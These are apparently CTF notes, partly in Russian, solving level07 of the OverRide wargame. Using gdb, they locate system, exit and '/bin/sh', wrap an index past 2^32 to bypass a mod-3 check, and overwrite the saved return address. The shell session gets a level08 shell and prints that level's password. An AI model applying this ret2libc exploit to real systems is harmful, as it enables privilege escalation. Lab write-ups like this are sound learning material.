https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3
https://shellblade.net/files/docs/ret2libc.pdf
btw these articles are useful for all prev levels starting 05 (NX protection)
https://undo.io/resources/gdb-watchpoint/how-search-byte-sequence-memory-gdb-command-find/ - find gdb

Нас встречает программа: которая сохраняет в data table цифорки. Спустя недолгое время ресеча натыкаемся на тему Ret2Libc attack: https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3 , https://shellblade.net/files/docs/ret2libc.pdf . Первая статья буквально по шагово объясняет нам как пройти данный уровень. 

Так же мы видим такой ряд функций:
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number - По любому здесь мы найдем адрес data table.
0x080486d7  read_number
0x08048723  main

Нам необходимо:
1. Найти адрес system
2. Найти адрес exit
3. Найти адрес "bin/sh"
4. Найти адрес data table
5. Найти eip адрес
6. Реализовать эксплойт (arg 1 = system, arg 2 = exit, arg 3 = bin/sh)


(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>  4159090384
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit> 4159040368
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec 4160264172

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd650:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Saved registers:
  ebp at 0xffffd648, eip at 0xffffd64c - наш eip


End of assembler dump.
(gdb) p $ebp+0x8
$1 = (void *) 0xffffd460
(gdb) x/a 0xffffd460
0xffffd460:    0xffffd484 - data table addr

0xffffd64c - 0xffffd484 = 456
456 / 4(sizeof(uint)) = 114
114 - protected (%3 == 0)
then use uint max(2^32) + 114:
1073741938
1073741938 % 3 = 1


Эксплойт:
1) store
    4159090384 (system)
    1073741938 (114 index)
2) store
    4159040368 (exit)
    115
3) store
    4160264172 (bin/sh)
    116
4) quit

level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08

$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
